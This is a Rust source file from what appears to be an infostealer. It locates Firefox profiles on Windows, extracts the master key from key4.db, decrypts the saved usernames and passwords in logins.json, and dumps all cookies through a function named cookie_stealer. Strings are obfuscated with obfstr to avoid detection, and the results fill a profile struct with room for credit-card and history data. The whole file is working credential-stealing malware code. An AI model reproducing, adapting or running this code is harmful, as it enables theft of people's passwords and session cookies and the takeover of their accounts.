use aes::Aes256;
use base64::DecodeError;
use block_modes::{BlockMode, BlockModeError};
use block_modes::{block_padding, Cbc, InvalidKeyIvLength};
use der_parser::{ber::BerObject, error::BerError};
use des::TdesEde3;
use ring::pbkdf2::PBKDF2_HMAC_SHA256;
use sha1::Sha1;
use rusqlite::Connection;
use std::fs::File;
use std::{collections::HashMap, io::Read, num::NonZeroU32, path::Path, string::FromUtf8Error};

use crate::chromium::utils::{LoginData, Cookie, Profile};

type Aes256Cbc = Cbc<Aes256, block_padding::NoPadding>;
type TripleDesCbc = Cbc<TdesEde3, block_padding::NoPadding>;

static CKA_ID: &[u8; 16] = b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01";

pub type Logins = HashMap<String, Vec<Login>>;
pub type FirefoxResult<T> = Result<T, FirefoxError>
;
#[derive(Debug, serde::Serialize, serde::Deserialize)]
pub struct Login {
    username: String,
    password: String,
}

impl std::fmt::Display for Login {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}:{}", self.username, self.password)
    }
}

fn get_firefox_paths() -> Option<std::path::PathBuf> {
    let path = &format!("{}\\{}", std::env::var("APPDATA").unwrap(), obfstr::obfstr!("Mozilla\\Firefox\\Profiles\\"));
    let path = std::path::Path::new(path);

    if path.exists() {
        Some(path.to_path_buf())
    }else {
        None
    }

}

pub async fn get_all_logins() -> FirefoxResult<Profile> {
    let mut logins = Logins::new();
    if let Some(ff_profiles) = get_firefox_paths() {
        for profile in ff_profiles.read_dir()? {
            if let Ok(profile) = profile {
                let mut key_db_path = profile.path().clone();
                key_db_path.push(obfstr::obfstr!("key4.db"));

                let mut logins_path = profile.path().clone();
                logins_path.push(obfstr::obfstr!("logins.json"));

                if let Ok(key) = get_key_from_db(&key_db_path) {
                    let _ = get_logins(&logins_path, &key, &mut logins).await;
                }
            }
        }
    }

    let mut remapped_logins = vec![];

    for login in logins {
        let login_data = LoginData {
            url: login.0,
            username: String::new(),
            password: String::new(),
        };

        for user_pw in login.1 {
            let mut cloned_login = login_data.clone();
            cloned_login.username = user_pw.username;
            cloned_login.password = user_pw.password;
            remapped_logins.push(cloned_login);
        }


        
    }

    let cookies = cookie_stealer();

    let profile = crate::chromium::utils::Profile {
        name: obfstr::obfstr!("Firefox").to_string(),
        path: String::new(),
        login_data: remapped_logins,
        local_state: String::new(),
        cookies,
        autofill: vec![],
        download_data: vec![],
        history: vec![],
        localstate_cache: None,
        extensions: HashMap::new(), //TODO: firefox extensions with sqlite
        credit_card_data: Vec::new(), //TODO: only implemented for chromium browser
    };

    Ok(profile)
}

#[derive(serde::Serialize, serde::Deserialize)]
struct LoginFile {
    logins: Vec<EncryptedLogins>,
}

#[derive(serde::Serialize, serde::Deserialize)]
struct EncryptedLogins {
    hostname: String,
    #[serde(rename = "encryptedUsername")]
    enc_usd: String,
    #[serde(rename = "encryptedPassword")]
    enc_pwd: String,
}
async fn get_logins(login_path: &Path, key: &[u8], logins: &mut Logins) -> FirefoxResult<()> {
    let mut login_file_content = String::new();
    if !std::path::Path::new(login_path).exists() {
       return Ok(());
    }
    File::open(login_path)
        ?
        .read_to_string(&mut login_file_content)?;

    let login_file: LoginFile = serde_json::from_str(&login_file_content)?;

    for login in &login_file.logins {
        match decrypt_login(login, key) {
            Ok((username, password)) => {
                logins
                    .entry(login.hostname.clone())
                    .or_default()
                    .push(Login { username, password });
            }
            Err(_) => continue,
        }
    }

    Ok(())
}

#[inline(always)]
fn decrypt_login(login: &EncryptedLogins, key: &[u8]) -> FirefoxResult<(String, String)> {
    let encrypted_username_raw = base64::decode(&login.enc_usd)?;
    let encrypted_password_raw = base64::decode(&login.enc_pwd)?;

    let (_, enc_user) = der_parser::ber::parse_ber(&encrypted_username_raw)?;
    let (_, enc_pass) = der_parser::ber::parse_ber(&encrypted_password_raw)?;

    let username = String::from_utf8(decrypt_3des(&enc_user, key)?)?;
    let password = String::from_utf8(decrypt_3des(&enc_pass, key)?)?;

    Ok((username, password))
}

fn decrypt_3des(decoded_item: &BerObject, key: &[u8]) -> FirefoxResult<Vec<u8>> {
    if decoded_item[1][0].as_oid()?.to_id_string() == obfstr::obfstr!("1.2.840.113549.3.7") {
        let iv = decoded_item[1][1].as_slice()?;
        let enc_data = decoded_item[2].as_slice()?;

        let cipher = TripleDesCbc::new_var(&key[0..24], iv)?;
        let mut raw_clear_data = cipher.decrypt_vec(enc_data).map_err(FirefoxError::mf)?;

        if let Some(&last) = raw_clear_data.last() {
            let last = usize::from(last);
            raw_clear_data.truncate(raw_clear_data.len().saturating_sub(last));
            Ok(raw_clear_data)
        } else {
            Err(FirefoxError::Malformed)
        }
    } else {
        Err(FirefoxError::Malformed)
    }
}

pub fn cookie_stealer() -> Vec<Cookie> {
    let mut cookies: Vec<Cookie> = Vec::new();
    let app_data = std::env::var("APPDATA").ok().unwrap();

    let path = &format!("{}\\{}", app_data, obfstr::obfstr!("Mozilla\\Firefox\\Profiles\\"));
    let firefox_profile_path = std::path::Path::new(path);

    if firefox_profile_path.is_dir() {
        for path in std::fs::read_dir(firefox_profile_path).unwrap() {
            let sqlite_db = path.unwrap().path().join(obfstr::obfstr!("cookies.sqlite"));
            if sqlite_db.exists() {
                let connection = rusqlite::Connection::open(sqlite_db).unwrap();
                let mut stmt = connection
                    .prepare(obfstr::obfstr!("SELECT host,name, path, value, expiry, isSecure FROM moz_cookies"))
                    .unwrap();


                    let person_iter = stmt
                    .query_map([], |row| {
                        let is_secure: bool = row.get(5).unwrap();
                        Ok(Cookie {
                        host: row.get(0)?,
                        name: row.get(1)?,
                        path: row.get(2)?,
                        value: row.get(3)?,
                        expires_utc: row.get(4)?,
                        is_secure: is_secure,
                        is_httponly: !is_secure,
                        })
                    }).unwrap().filter(|f| f.is_ok()).map(|f| f.unwrap()).collect::<Vec<Cookie>>();

                    cookies.extend(person_iter);
                    /*for cookie in person_iter {
                        cookies.push(cookie);
                        //cookies.push(format!("{hostkey}\t{isSecure}\t{path}\t{isSecure}\t{expireUTC}\t{name}\t{value}", hostkey = cookie.host, isSecure = cookie.is_secure, path = cookie.path, expireUTC = cookie.expires, name = cookie.name, value = cookie.value));
                    }*/

                    
            }
        }
    }
    return cookies;
}

fn get_key_from_db(path: &Path) -> FirefoxResult<Vec<u8>> { // Ugly af code
    let conn = Connection::open(path)?;

    let mut row = conn.prepare(
        obfstr::obfstr!("SELECT item1, item2 FROM metadata WHERE id = 'password' LIMIT 1;")
    )?;
    
    let mut item1_result: Vec<u8> = vec![];
    let mut item2_result: Vec<u8> = vec![];

    let data = row.query_map([], |rows| {
        let item1: Vec<u8> = rows.get(0)?;
        let item2: Vec<u8> = rows.get(1)?;
        Ok((item1, item2))
    })?;


    for x in data {
        let (item1, item2) = x.unwrap();
        item1_result = item1;
        item2_result = item2;
    } 

    let password = get_clear_value(&item2_result, &item1_result)?;
    if password == obfstr::obfstr!("password-check\x02\x02").as_bytes() {
        let mut row = conn.prepare(
            obfstr::obfstr!("SELECT a11,a102 FROM nssPrivate LIMIT 1;")
        )?;
        
        let data = row.query_map([], |rows| {
            let a11: Vec<u8> = rows.get(0)?;
            let a102: Vec<u8> = rows.get(1)?;
            Ok((a11, a102))
        })?;

        let mut a11_result = vec![];
        let mut a102_result = vec![];

        for x in data {
            let (a11, a102) = x.unwrap();
            if &a102 == CKA_ID {
                a11_result = a11;
                a102_result = a102;
            }
        }

        if a102_result == CKA_ID {
            get_clear_value(&a11_result, &item1_result)
        } else {
            Err(FirefoxError::Malformed)
        }
    } else {
        Err(FirefoxError::Malformed)
    }
}

fn get_clear_value(raw_ber: &[u8], global_salt: &[u8]) -> FirefoxResult<Vec<u8>> {
    let (_, item2_decoded) = der_parser::der::parse_der(raw_ber)?;

    let algorithm = item2_decoded[0][0].as_oid()?.to_id_string();

    if algorithm == obfstr::obfstr!("1.2.840.113549.1.5.13") {
        get_value_pbes2(&item2_decoded, &global_salt)
    } else {
        Err(FirefoxError::Malformed)
    }
}

fn get_value_pbes2(decoded_item: &BerObject, global_salt: &[u8]) -> FirefoxResult<Vec<u8>> {
    let entry_salt = decoded_item[0][1][0][1][0]
        .as_slice()
        .map_err(FirefoxError::mf)?;
    let iteration_count = decoded_item[0][1][0][1][1]
        .as_u32()
        .map_err(FirefoxError::mf)?;
    let key_length = decoded_item[0][1][0][1][2]
        .as_u32()
        .map_err(FirefoxError::mf)?;
    let cipher_txt = decoded_item[1].as_slice().map_err(FirefoxError::mf)?;
    let iv_body = decoded_item[0][1][1][1]
        .as_slice()
        .map_err(FirefoxError::mf)?;

    if key_length == 32 {
        let mut k_hasher = Sha1::new();
        k_hasher.update(global_salt);

        // we know the key is 32 bytes in advance
        let mut key = vec![0u8; 32];

        let k = k_hasher.digest().bytes();
        ring::pbkdf2::derive(
            PBKDF2_HMAC_SHA256,
            NonZeroU32::new(iteration_count).ok_or(FirefoxError::Malformed)?,
            entry_salt,
            &k,
            &mut key,
        );

        let iv_header = [0x04, 0x0e];
        let mut iv = Vec::with_capacity(iv_header.len() + iv_body.len());
        iv.extend_from_slice(&iv_header);
        iv.extend_from_slice(iv_body);

        let key_cipher = Aes256Cbc::new_var(&key, &iv)?;
        let value = key_cipher.decrypt_vec(&cipher_txt)?;

        Ok(value)
    } else {
        Err(FirefoxError::Malformed)
    }
}

#[derive(Debug)]
pub enum FirefoxError {
    Error1(rusqlite::Error),
    Error2(der_parser::nom::Err<BerError>),
    Error3(BerError),
    Malformed,
    Utf8(FromUtf8Error),
    Io,
}
impl FirefoxError {
    fn mf<T>(_: T) -> Self {
        FirefoxError::Malformed
    }
}

impl From<BerError> for FirefoxError {
    fn from(e: BerError) -> Self {
        FirefoxError::Error3(e)
    }
}
impl From<der_parser::nom::Err<BerError>> for FirefoxError {
    fn from(e: der_parser::nom::Err<BerError>) -> Self {
        FirefoxError::Error2(e)
    }
}
impl From<rusqlite::Error> for FirefoxError {
    fn from(e: rusqlite::Error) -> Self {
        FirefoxError::Error1(e)
    }
}

impl From<BlockModeError> for FirefoxError {
    fn from(_: BlockModeError) -> Self {
        FirefoxError::Malformed
    }
}

impl From<FromUtf8Error> for FirefoxError {
    fn from(e: FromUtf8Error) -> Self {
        FirefoxError::Utf8(e)
    }
}
impl From<InvalidKeyIvLength> for FirefoxError {
    fn from(_: InvalidKeyIvLength) -> Self {
        FirefoxError::Malformed
    }
}
impl From<DecodeError> for FirefoxError {
    fn from(_: DecodeError) -> Self {
        FirefoxError::Malformed
    }
}
impl From<serde_json::Error> for FirefoxError {
    fn from(_: serde_json::Error) -> Self {
        FirefoxError::Malformed
    }
}
impl From<std::io::Error> for FirefoxError {
    fn from(_: std::io::Error) -> Self {
        FirefoxError::Io
    }
}